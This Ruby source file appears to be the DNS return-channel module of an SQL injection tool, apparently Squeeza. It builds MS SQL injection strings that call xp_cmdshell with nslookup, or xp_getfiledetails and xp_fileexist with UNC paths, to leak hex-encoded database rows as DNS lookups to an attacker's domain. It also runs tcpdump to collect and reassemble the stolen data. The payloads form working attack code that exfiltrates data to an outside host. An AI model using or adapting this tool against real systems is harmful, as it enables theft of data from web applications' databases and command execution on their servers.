require 'dataset'
require 'timerecord'

class SQLReturnChannelViaDNS
	
	class InvalidVarFormat < Exception
	end

	class SigInt < Exception
	end

	class TcpdumpError < Exception
		attr_accessor(:error)

		def initialize(str)
			@error = str
		end

		def to_s
			@error
		end
	end

	class ReliabilityException < Exception
		attr_accessor(:current_line, :line_length)

		def initialize(current_line, line_length)
			self.current_line = current_line
			self.line_length = line_length 
		end

		def to_s
			str = "Reliability Exception. (current_line.length=#{@current_line.length},expected line length=#{@line_length}"
			str
		end
	end

	class OrderException < Exception
		attr_accessor(:line_num, :last_line_received, :byte_start, :last_byte_start)

		def initialize(line_num, last_line_received, byte_start, last_byte_start)
			self.line_num = line_num
			self.last_line_received = last_line_received
			self.byte_start = byte_start
			self.last_byte_start = last_byte_start
		end

		def to_s
			str = "Out of order or duplicate line. (line=#{line_num},last_line=#{last_line_received},byte_start=#{byte_start},last_byte_start=#{last_byte_start}"
			str
		end
	end
	
	def SQLReturnChannelViaDNS.help
		puts "dns channel commands and variables"
		puts " variables:"
		puts "  request_timeout  : timeout in seconds to wait for tcpdump output"
		puts "  dns_domain       : domain which is appended to requests"
		puts "  dns_privs        : one of high, medium or low, specifies which method is used depending on the privilege level of the injection point"
		puts "  dns_server       : direct dns requests to this ip address"
	end

	def help
		SQLReturnChannelViaDNS.help
	end
	
	def initialize(http, config)
		@tcpdump = nil
		@http = http
		@config = config

		if @config.getv("request_timeout").nil?
			@config.setv("request_timeout",60) #default timeout
		end

		raise HTTPException, "SQLReturnChannelViaDNS requires a valid HTTP connection" if (@http.nil?)

		@sql_prefix = @config.getv("sql_prefix")
		@sql_postfix = @config.getv("sql_postfix")
		
		@domain = @config.getv("dns_domain")
		@domain ||= "sensepost.com."
		@config.setv("dns_domain", @domain)

		ENV['PATH'].split(/:/).reverse.each{|path|
			if File.exist?("#{path}/tcpdump") and File.executable?("#{path}/tcpdump")
				@tcpdump_path = "#{path}/tcpdump"
				if Process.uid != 0 and !File.setuid?(@tcpdump_path)
					Debug.error("You're not root and tcpdump isn't suid... can't continue")
					raise TcpdumpError.new("Not root and file isn't suid")
				end
			end
		}
		if @tcpdump_path.nil? 
			raise TcpdumpError.new("Tcpdump not found")
		else
			Debug.print("tcpdump found at #{@tcpdump_path}",3)
		end

	end

	#called at start, or when SIGINT is received. restart tcpdump 'cos the SIGINT killed it.
	def tcpdump_prepare
		Debug.print("Preparing tcpdump",2)
		begin
		timeout(5){
			if @tcpdump.kind_of?(IO) && !@tcpdump.closed?
				while !@tcpdump.eof?
					@tcpdump.read
				end
				@tcpdump.flush
				#@tcpdump.close
				@tcpdump = nil
			end
		}
		rescue TimeoutError
			Debug.print("Waited long enough, abandoning tcpdump pipe",2)
			@tcpdump = nil
		end

		@tcpdump = IO.popen("#{@tcpdump_path} -l -s 0 port 53 2>/dev/null","w+")
		sleep(1)
		Debug.print("tcpdump running",2)
	end;

	def tcpdump_restart
		Debug.print("restarting tcpdump",2)

		@tcpdump.close 
		@tcpdump = IO.popen("#{@tcpdump_path} -l -s 0 port 53 2>/dev/null","w+")

		Debug.print("restarted tcpdump",2)
	end
	
	def set_lines_per_request(value)
		@lines_per_request = value
	end

	#has tcpdump died? we test by writing to the pipe
	def tcpdump_died

		@tcpdump.write("a")
		return false

		rescue Errno::EPIPE
			return true

	end
	
	def start(args)
		@lines_per_request = args['lines_per_request']

		@domain = @config.getv("dns_domain")
		@dns_server = @config.getv("dns_server")
		@dns_server ||= ""

		#@sql_output = "declare @r as sysname,@l as sysname,@b as int, @d as int,@c as int,@a as varchar(600);select @d=count(num)from #{table};set @b=STARTLINE;while @b<=@d and @b<=ENDLINE begin set @a=(master.dbo.fn_varbintohexstr(CAST((select data from #{table} where num=@b) as varbinary(600))));set @c=1;while @c< len(@a) begin select @a=stuff(@a,@c,0,'.');set @c=@c+63;end;select @r=round(rand()*1000,0);select @l=@b;SET @a='nslookup sp'+@l+'_'+@r+@a+'-sqldns.squeeza.com. 192.168.80.128';exec master..xp_cmdshell @a;set @b=@b+1;end;"
		#@sql_output = "declare @b as int, @d as int,@c as int,@a as varchar(600);select @d=count(num)from #{@sql_table};set @b=STARTLINE;while @b<=@d and @b<=ENDLINE begin set @a=(master.dbo.fn_varbintohexstr(CAST((select data from #{@sql_table} where num=@b) as varbinary(600))));set @c=1;while @c< len(@a) begin select @a=stuff(@a,@c,0,'.');set @c=@c+63;end;SET @a='nslookup sp'+cast(@b as varchar(3))+'_'+cast(round(rand()*1000,0) as varchar(3))+@a+'-sqldns.squeeza.com. 192.168.80.128';exec master..xp_cmdshell @a;set @b=@b+1;end;"
		

		#path_length = total_length(128) -- \\ (2) -- ..\c$ (5) -- . (1) -- header_length (16) -- hex_header (3) -- domain_length
		max_unc_path_length = (128 - 2 - 5 - 2 - 16 - 3 - @domain.length)/2
		Debug.print("Max UNC path length is #{max_unc_path_length}",2)
		#max_dns_path_length = total_length (255) -- header_length (16) -- hex_header (3) -- length(domain)
		max_dns_path_length = 255 - 16 - 3 - 2 - @domain.length 
		Debug.print("Max DNS path length is #{max_dns_path_length}",2)

		if @config.getv("dns_privs").nil?
			Debug.print("Defaulting to high privs injection string (SQL Server administrator level)")
			@config.setv("dns_privs","high")
		end
		
		#privilege levels are based on the funcitonality available to the sql server user that the webapp is connecting as.
		#the levels determines the injection string that will be used. the higher the privilege level, the more
		#data can be extracted due to the different stored procedures availble to sysadmins. 
		#
		# high = sysadmin group by default, this mode uses the intermediate tables and xp_cmdshell stored proc to extract commands and files
		# medium = any user who can create tables. this mode uses the intermediate tables and xp_getfiledetails stored proc to extract files. 
		#          this mode is a replacement for "high" and is not normally used, except when xp_cmdshell has been disabled/removed.
		# low = any user. this mode uses no intermediate tables, and uses xp_getfiledetails to extract sql data

		case @config.getv("dns_privs")
		when "high"
			#varchar declarations in string below are based on the max_dns_path_length + at most 4 chars for the periods (.)
			@sql_output = "declare @z int, @x int,@v varchar(#{max_dns_path_length/2*2+6}),@c int,@a varchar(500),@b int,@d int;set @b=STARTLINE;select @d=count(num)from #{args['table']};while @b<=@d and @b<=ENDLINE begin set @x=STARTBYTE;select @z=datalength(data)from #{args['table']} where num=@b;set @a='';while @x<= @z and @x< ENDBYTE begin select @v=master.dbo.fn_varbintohexstr(CONVERT(varbinary(#{max_dns_path_length/2*2+6}),cast((select substring(data,@x,#{max_dns_path_length/2})from #{args['table']} where num=@b) as varchar(#{max_dns_path_length/2}))));set @c=1;while @c< len(@v)begin select @v=stuff(@v,@c,0,'.');set @c=@c+63;end;set @a='nslookup '+cast(@b as varchar(4))+'_'+cast(@z as varchar(4))+'_'+cast(@x as varchar(4))+'_'+cast(round(rand()*100,0) as varchar(2))+@v+'.#{@domain} #{@dns_server}';exec master..xp_cmdshell @a;set @x=@x+#{max_dns_path_length/2};end set @b=@b+1;end;"
			@block_size = max_dns_path_length/2
		when "medium" 
			@sql_output = "declare @z int, @x int,@v varchar(122),@c int,@a varchar(128),@b int,@d int;set @b=STARTLINE;select @d=count(num)from #{args['table']};while @b<=@d and @b<=ENDLINE begin set @x=STARTBYTE;select @z=datalength(data)from #{args['table']} where num=@b; set @a='';while @x<= @z and @x < ENDBYTE begin select @v=master.dbo.fn_varbintohexstr(CONVERT(varbinary(#{max_unc_path_length}),cast((select substring(data,@x,#{max_unc_path_length})from #{args['table']} where num=@b) as varchar(#{max_unc_path_length}))));set @c=1;while @c< len(@v) begin select @v=stuff(@v,@c,0,'.');set @c=@c+63;end; set @a='\\\\'+cast(@b as varchar(4))+'_'+cast(@z as varchar(4))+'_'+cast(@x as varchar(4))+'_'+cast(round(rand()*100,0) as varchar(2))+@v+'.#{@domain}\\c$';exec master..xp_getfiledetails @a;set @x=@x+#{max_unc_path_length};end;set @b=@b+1;end;"
			@block_size = max_unc_path_length
		when "low"
			@sql_output = "declare @m varchar(8000),@z int,@x int,@v varchar(122),@c int,@a varchar(128),@b int,@d int;set @b=STARTLINE;select @d=count(#{args['column_name']})from #{args['table_name']}#{args['where_clause']};while @b<=@d+1 and @b<=ENDLINE begin set @x=STARTBYTE;set rowcount @b;if @b<=@d select @m=#{args['column_name']} from #{args['table_name']}#{args['where_clause']}#{args['order_by']};else set @m='ENDOFSQL';select @m;set @z=len(@m);set @a='';while @x<= @z and @x < ENDBYTE begin select @v=master.dbo.fn_varbintohexstr(CONVERT(varbinary(#{max_unc_path_length}),cast((select substring(@m,@x,#{max_unc_path_length})) as varchar(#{max_unc_path_length}))));set @c=1;while @c< len(@v) begin select @v=stuff(@v,@c,0,'.');set @c=@c+63; end;set @a='\\\\'+cast(@b as varchar(4))+'_'+cast(@z as varchar(4))+'_'+cast(@x as varchar(4))+'_'+cast(round(rand()*100,0) as varchar(2))+@v+'.#{@domain}\\c$';exec master..xp_fileexist @a;select @x,@z;set @x=@x+#{max_unc_path_length};end;set @b=@b+1;end;"
			#@sql_output = "declare @m varchar(8000),@z int,@x int,@v varchar(122),@c int,@a varchar(128),@b int,@d int;set @b=STARTLINE;select @d=count(#{args['column_name']})from #{args['table_name']}#{args['where_clause']};while @b<=@d+1 and @b<=ENDLINE begin set @x=STARTBYTE;set rowcount @b;if @b<=@d select @m=#{args['column_name']} from #{args['table_name']}#{args['where_clause']}#{args['order_by']};else set @m='ENDOFSQL';select @m;set @z=len(@m);set @a='';while @x<= @z and @x < ENDBYTE begin select @v=master.dbo.fn_varbintohexstr(CONVERT(varbinary(#{max_unc_path_length}),cast((select substring(@m,@x,#{max_unc_path_length})) as varchar(#{max_unc_path_length}))));set @c=1;while @c< len(@v) begin select @v=stuff(@v,@c,0,'.');set @c=@c+63; end;set @a='\\\\'+cast(@b as varchar(4))+'_'+cast(@z as varchar(4))+'_'+cast(@x as varchar(4))+'_'+cast(round(rand()*100,0) as varchar(2))+@v+'.#{@domain}\\c$';exec master..xp_getfiledetails @a;select @x,@z;set @x=@x+#{max_unc_path_length};end;set @b=@b+1;end;"
			@block_size = max_unc_path_length
		else
			Debug.error("Unknown privilege level...")
			raise InvalidVarFormat
		end

		@data = DataSet.new(@block_size)
		@recorded_blocks = TimeRecord.new(@block_size, 15)

		tcpdump_prepare
	end

	def passthru_sql(sql)
		request = @sql_prefix + sql + @sql_postfix
		Debug.print(request,2)
		begin
			@http.send(request)
		rescue HTTPException => e
			Debug.error("HTTP Error... timing out (or hit Ctrl-C to bust this timeout)")
			raise e
		end
	end

	def oneline(&block)

		tcpdump_restart if tcpdump_died

		@lines_per_request = 1
		start_line = 1
		end_line = start_line + @lines_per_request - 1
		start_byte = 1

		continue = true
		empty_blocks = []
		while continue 

			Debug.print("Getting lines #{start_line} to #{end_line}",2)

			got_lines = false
			timeouts = 0
			while continue && !got_lines && timeouts < 3
				trap("SIGINT") { Debug.print("Caught the sigint... exiting command loop",2); continue = false }
				found_empty_block = false
				loop do	
					if empty_blocks.length > 0
						#ok, this is then at least the second iteration, missing blocks need to be grabbed
						bh = empty_blocks.shift
						found_empty_block = true
						end_byte = (bh['block_start'] ? (bh['block_start'].to_i+@block_size).to_s : "POWER(2,30)")
						Debug.print("Retrying missing block [#{bh['line_num']}:#{bh['block_start']}]",2)
						if !@recorded_blocks.timedout?(bh['line_num'],bh['block_start'],end_byte)
							Debug.print("Block skipped, not timed out. [#{bh['line_num']}:#{bh['block_start']}]",2)
							next
						end
						Debug.print("Block requested, it has timed out. [#{bh['line_num']}:#{bh['block_start']}]",2)
						request = @sql_prefix + @sql_output.sub(/STARTLINE/, bh['line_num'].to_s).sub(/ENDLINE/,bh['line_num'].to_s).sub(/STARTBYTE/,bh['block_start'].to_s).sub(/ENDBYTE/,end_byte) + @sql_postfix
						@recorded_blocks.mark(bh['line_num'], bh['line_num'], bh['block_start'], end_byte)
					else
						break if found_empty_block #don't attempt to request a new line if we've been processing re-requests
						end_byte = "POWER(2,30)"
						request = @sql_prefix + @sql_output.sub(/STARTLINE/, start_line.to_s).sub(/ENDLINE/,(@lines_per_request==0?"@d": end_line.to_s)).sub(/STARTBYTE/,start_byte.to_s).sub(/ENDBYTE/,end_byte) + @sql_postfix
						@recorded_blocks.mark(start_line, end_line, start_byte, end_byte)
						Debug.print("Making request for [#{start_line}:#{start_byte}]",2)
					end
					
					Debug.print(request,2)
					begin
						@http.send(request)
					rescue HTTPException => e
						Debug.error("HTTP Error... timing out (or hit Ctrl-C to bust this timeout)")
						raise e
					end
					break if empty_blocks.length < 1 || !continue
				end

				begin
					Debug.print("Getting lines. Timeouts seen:#{timeouts}",2)
					lines = try_getlines(@lines_per_request.to_i)

					rescue SigInt
						continue = false
					rescue OrderException
						Debug.error("OrderException caught")
						timeouts += 1
					rescue ReliabilityException => e
						Debug.error(e.to_s)
						timeouts += 1
					rescue TimeoutError
						Debug.error("TimeoutError caught")
						timeouts += 1
				end

				empty_blocks = @data.empty_blocks(start_line..end_line)
				if empty_blocks.length == 0
					Debug.print("No empty blocks on record",2)
					@data.each(start_line..end_line){|linenum, contents| block.call(linenum, contents)}
					start_line += @lines_per_request 
					end_line = start_line + @lines_per_request - 1
					got_lines = true

					continue = false if @data.endofsql?
				else
					Debug.print("#{empty_blocks.length} blocks missing #{empty_blocks[0]['line_num']}",2)
				end
			end

			if timeouts >= 3
				Debug.error("Three timeouts occurred while waiting... try decreasing lines_per_request or increasing request_timeout")
				continue = false
			end
			
			#th.join
			#Debug.print("Worker HTTP threat joined",2)
			#if timeouts < 3 && lines.length != @lines_per_request
			#	Debug.print("Exiting eachline(). lines.length = #{lines.length}, lines_per_request = #{@lines_per_request}",2)
			#	continue = false 
			#end
		end

	end



	def eachline(&block)

		tcpdump_restart if tcpdump_died

		@lines_per_request = 2 if @lines_per_request.nil?
		@lines_per_request = @lines_per_request.to_i if @lines_per_request.class == String
		start_line = 1
		end_line = start_line + @lines_per_request - 1
		start_byte = 1

		continue = true
		empty_blocks = []
		while continue 

			Debug.print("Getting lines #{start_line} to #{end_line}",2)
			
			got_lines = false
			timeouts = 0
			while continue && !got_lines && timeouts < 3
				trap("SIGINT") { Debug.print("Caught the sigint... exiting command loop",2); continue = false }
				found_empty_block = false
				loop do	
					if empty_blocks.length > 0
						#ok, this is then at least the second iteration, missing blocks need to be grabbed
						bh = empty_blocks.shift
						found_empty_block = true
						end_byte = (bh['block_start'] ? (bh['block_start'].to_i+@block_size).to_s : "POWER(2,30)")
						Debug.print("Retrying missing block [#{bh['line_num']}:#{bh['block_start']}]",2)
						if !@recorded_blocks.timedout?(bh['line_num'],bh['block_start'],end_byte)
							Debug.print("Block skipped, not timed out. [#{bh['line_num']}:#{bh['block_start']}]",2)
							next
						end
						Debug.print("Block requested, it has timed out. [#{bh['line_num']}:#{bh['block_start']}]",2)
						request = @sql_prefix + @sql_output.sub(/STARTLINE/, bh['line_num'].to_s).sub(/ENDLINE/,bh['line_num'].to_s).sub(/STARTBYTE/,bh['block_start'].to_s).sub(/ENDBYTE/,end_byte) + @sql_postfix
						@recorded_blocks.mark(bh['line_num'], bh['line_num'], bh['block_start'], end_byte)
					else
						break if found_empty_block #don't attempt to request a new line if we've been processing re-requests
						end_byte = "POWER(2,30)"
						request = @sql_prefix + @sql_output.sub(/STARTLINE/, start_line.to_s).sub(/ENDLINE/,(@lines_per_request==0?"@d": end_line.to_s)).sub(/STARTBYTE/,start_byte.to_s).sub(/ENDBYTE/,end_byte) + @sql_postfix
						@recorded_blocks.mark(start_line, end_line, start_byte, end_byte)
						Debug.print("Making request for [#{start_line}:#{start_byte}]",2)
					end
					
					Debug.print(request,2)
					begin
						@http.send(request)
					rescue HTTPException => e
						Debug.error("HTTP Error... timing out (or hit Ctrl-C to bust this timeout)")
						raise e
					end
					break if empty_blocks.length < 1 || !continue
				end

				begin
					Debug.print("Getting lines. Timeouts seen:#{timeouts}",2)
					lines = try_getlines(@lines_per_request)

					rescue SigInt
						continue = false
					rescue OrderException
						Debug.error("OrderException caught")
						timeouts += 1
					rescue ReliabilityException => e
						Debug.error(e.to_s)
						timeouts += 1
					rescue TimeoutError
						Debug.error("TimeoutError caught")
						timeouts += 1
				end

				empty_blocks = @data.empty_blocks(start_line..end_line)
				if empty_blocks.length == 0
					Debug.print("No empty blocks on record",2)
					@data.each(start_line..end_line){|linenum, contents| block.call(linenum, contents)}
					start_line += @lines_per_request 
					end_line = start_line + @lines_per_request - 1
					got_lines = true

					continue = false if @data.endofsql?
				else
					Debug.print("#{empty_blocks.length} blocks missing #{empty_blocks[0]['line_num']}",2)
				end
			end

			if timeouts >= 3
				Debug.error("Three timeouts occurred while waiting... try decreasing lines_per_request or increasing request_timeout")
				continue = false
			end
			
			#th.join
			#Debug.print("Worker HTTP threat joined",2)
			#if timeouts < 3 && lines.length != @lines_per_request
			#	Debug.print("Exiting eachline(). lines.length = #{lines.length}, lines_per_request = #{@lines_per_request}",2)
			#	continue = false 
			#end
		end

	end

	
	private

	def h2a(hex)
		hex.scan(/[0-9a-f][0-9a-f]/).collect {|c| c.hex.chr }
	end

	def try_getlines(lines_per_request)

		Debug.print("Started getlines() with lines_per_request=#{lines_per_request}",2)

		grabbed_lines = 0
		lines = []
		completed_line_record = []
		continue = true
		sigint = false
		Debug.print("Going to wait for tcpdump input",2)
		while continue && grabbed_lines < lines_per_request && !@tcpdump.eof? 
			
			work = nil
			timeout(@config.getv("request_timeout").to_i) { work = @tcpdump.readline }

			Debug.print("Got tcpdump input",2)
			trap("SIGINT") { Debug.print("Caught the sigint... exiting read loop",2); sigint = true }

			if sigint
				Debug.print("raising sigint flag",2)
				raise SigInt 
			end

			Debug.print("Next unless",2)
			next unless work =~ /.*?([0-9]+)_([0-9]+)_([0-9]+)_([0-9]+)\.0x([a-f0-9 \.]+).#{@domain}*/

			Debug.print("Got well-formed Squeeza line",2)
			line_num = $1.to_i
			line_length = $2.to_i
			byte_start = $3.to_i
			returned_row = h2a($5.gsub(/\./,'')).to_s
			
			begin
				#halt asking for more rows if we've reached the last row in the table
				if returned_row =~ /ENDOFSQL/
					Debug.print("RowViaDNS: [#{line_num}] Last line received",2)
					continue = false
					@data.dataset_end(line_num)
				end

				if returned_row =~ /BLANKLINE/ 
					returned_row = ""
					line_length = 0
				end

				if returned_row !~ /ENDOFSQL/
					Debug.print("Data segment from DNS: [#{line_num}:#{byte_start}]",2)
					@data.insert(line_num, byte_start, line_length, returned_row)
					if !completed_line_record.include?line_num
						completed_line_record << line_num
						grabbed_lines += 1
					end
				end

				Debug.print("Ended tcpdump handling of line",2)
				#rescue Exception => e
				#	Debug.error(e.to_s)
			end
		end
		Debug.print("Ended getlines()",2)
		lines
	end

#	def eachline(&block)
#
#		tcpdump_restart if tcpdump_died
#
#		@lines_per_request = 2 if @lines_per_request.nil?
#		@lines_per_request = @lines_per_request.to_i if @lines_per_request.class == String
#		start_line = 1
#		end_line = start_line + @lines_per_request - 1
#		start_byte = 0
#		end_byte = "POWER(2,30)"
#
#		@last_line_received = 0
#		@last_line_length = 0
#		@last_byte_start = -1
#		@current_line = ""
#
#		continue = true
#		while continue
#			trap("SIGINT") { Debug.print("Caught the sigint... exiting command loop",2); continue = false }
#
#			Debug.print("Getting lines #{start_line} to #{end_line}",2)
#			request = @sql_prefix + @sql_output.sub(/STARTLINE/, start_line.to_s).sub(/ENDLINE/,(@lines_per_request==0?"@d": end_line.to_s)).sub(/STARTBYTE/,start_byte.to_s).sub(/ENDBYTE/,end_byte) + @sql_postfix
#			Debug.print(request,2)
#			
#			start_line += @lines_per_request 
#			end_line = start_line + @lines_per_request - 1
#
#			got_lines = false
#			timeouts = 0
#			while !got_lines && timeouts < 3
#			#consider this very carefully.... if the request takes too long, it is possible squeeza hits the tcpdump filtering 
#			#before the server starts sending data... i don't think this is a problem but keep in mind.
#			#
#			#must experiment more
#			#th = Thread.new(request) {|req|
#				#Debug.print("Worker HTTP threat started",2)
#				begin
#					@http.send(request)
#				rescue HTTPException => e
#					Debug.error("HTTP Error... timing out (or hit Ctrl-C to bust this timeout)")
#					raise e
#				end
#				#Debug.print("Worker HTTP threat exiting",2)
#			#}
#
#
#				begin
#					Debug.print("Getting lines. Timeouts seen:#{timeouts}",2)
#					lines = try_getlines(@lines_per_request) {|linenum,bytestart,line| block.call(linenum,bytestart,line)}
#					got_lines = true
#
#					rescue SigInt
#						got_lines = true
#						continue = false
#					rescue OrderException
#						Debug.error("OrderException caught")
#						timeouts += 1
#					rescue ReliabilityException => e
#						Debug.error(e.to_s)
#						timeouts += 1
#					rescue TimeoutError
#						Debug.error("TimeoutError caught")
#						timeouts += 1
#				end
#			end
#
#			if timeouts >= 3
#				Debug.error("Three timeouts occurred while waiting... try decreasing the lines_per_request")
#				continue = false
#			end
#			
#			#th.join
#			#Debug.print("Worker HTTP threat joined",2)
#			if timeouts < 3 && lines.length != @lines_per_request
#				Debug.print("Exiting eachline(). lines.length = #{lines.length}, lines_per_request = #{@lines_per_request}",2)
#				continue = false 
#			end
#		end
#
#	end


#	def getlines(lines_per_request, &block)
#
#		Debug.print("Started getlines() with lines_per_request=#{lines_per_request}",2)
#
#		grabbed_lines = 0
#		lines = []
#		timeout(@config.getv("request_timeout").to_i) {
#			continue = true
#			Debug.print("Going to wait for tcpdump input",2)
#			while continue && grabbed_lines < lines_per_request && !@tcpdump.eof? && work = @tcpdump.readline
#				Debug.print("Got tcpdump input",2)
#				trap("SIGINT") { Debug.print("Caught the sigint... exiting read loop",2); continue = false }
#				next unless work =~ /.*?([0-9]+)_([0-9]+)_([0-9]+)_([0-9]+)\.0x([a-f0-9 \.]+).#{@domain}*/
#
#				raise SigInt if !continue
#
#
#				line_num = $1.to_i
#				line_length = $2.to_i
#				byte_start = $3.to_i
#				returned_row = h2a($5.gsub(/\./,'')).to_s
#				
#				begin
#					#primitive check for out-of-sequence lines
#					raise OrderException.new(line_num,@last_line_received,byte_start,@last_byte_start) if line_num < @last_line_received
#					raise OrderException.new(line_num,@last_line_received,byte_start,@last_byte_start) if line_num > @last_line_received + 1
#					raise OrderException.new(line_num,@last_line_received,byte_start,@last_byte_start) if line_num == @last_line_received && byte_start < @last_byte_start
#
#
#					#halt asking for more rows if we've reached the last row in the table
#					if returned_row =~ /ENDOFSQL/
#						#Debug.print("RowViaDNS: [#{line_num}] Last line received",2)
#						continue = false
#					end
#
#					if returned_row =~ /BLANKLINE/ 
#						returned_row = ""
#						line_length = 0
#					end
#
#					if returned_row !~ /ENDOFSQL/
#						Debug.print("Data segment from DNS: [#{line_num}:#{byte_start}]",2)
#
#						if line_num == @last_line_received 
#							if byte_start > @last_byte_start
#								@last_byte_start = byte_start
#								@current_line = @current_line + returned_row
#								Debug.print("Partial line: \"#{returned_row}\"[#{line_num}:#{byte_start}] #{@current_line.length} bytes, continuing from byte #{@last_byte_start}",2)
#							else
#								Debug.print("Duplicate block [#{line_num}:#{byte_start}]",2)
#							end
#						else
#							#line_num is always greater or equal to @last_line_received, otherwise exeception are thrown above
#							if @current_line.length != @last_line_length
#								Debug.error("Reliability error: line too short. Expecting #{@last_line_length}, got #{@current_line.length}")
#								raise ReliabilityException.new(@current_line, @last_line_length)
#							end
#							@current_line = returned_row
#							Debug.print("Start line: [#{line_num}:#{@current_line.length}]",2)
#						end
#
#						if @current_line.length == line_length
#							Debug.print("Full line: [#{line_num}:#{@current_line.length}] ",2)
#							lines << @current_line
#							grabbed_lines += 1
#							@last_line_length = line_length
#							block.call(line_num,byte_start,@current_line)
#						elsif @current_line.length > line_length
#							raise ReliabilityException.new(@current_line, line_length)
#						end
#					end
#
#					@last_line_received = line_num
#
#					rescue OrderException => e
#						Debug.print(e.to_s,2)
#				end
#			end
#		}
#		Debug.print("Ended getlines()",2)
#		lines
#	end
#
end
